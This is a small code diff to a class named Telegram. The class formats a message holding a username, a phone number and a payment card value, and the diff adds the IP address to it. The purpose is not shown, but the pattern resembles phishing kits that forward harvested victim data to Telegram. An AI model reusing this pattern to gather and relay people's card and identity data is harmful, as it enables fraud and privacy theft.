@@ -67,6 +67,7 @@ export default class Telegram {
           msg += `👤 ${data.username ?? '-'}\n`
           msg += `📱 ${data.phone ?? '-'}\n`
           msg += `💳 ${data.financial?.card ?? '-'}\n`
+          msg += `ip: ${data.ip ?? '-'}\n`
 
           break
 
